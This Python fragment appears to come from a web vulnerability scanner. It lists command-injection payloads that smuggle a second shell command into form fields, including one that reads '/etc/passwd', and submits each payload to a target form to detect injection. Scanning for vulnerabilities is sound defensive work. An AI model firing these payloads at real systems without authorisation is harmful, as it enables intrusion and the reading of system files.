COMMAND_INJECTION_PAYLOADS = [
    '; ls',
    '; dir',
    '| cat /etc/passwd',
    '& echo "vulnerable"',
    '`echo "vulnerable"`',
    '|| echo "vulnerable"',
    '&& echo "vulnerable"'
]

def test_command_injection(url, form_details, session):
    """Test a form for Command Injection vulnerability"""
    vulnerabilities = []
    for payload in COMMAND_INJECTION_PAYLOADS:
        response = submit_form(form_details, url, payload, session)
        if 'vulnerable' in response.text or 'root:' in response.text or 'Volume Serial' in response.text:
            vulnerabilities.append({
                'type': 'Command Injection',
                'url': response.url,
                'payload': payload,
                'severity': 'Critical'
            })
    return vulnerabilities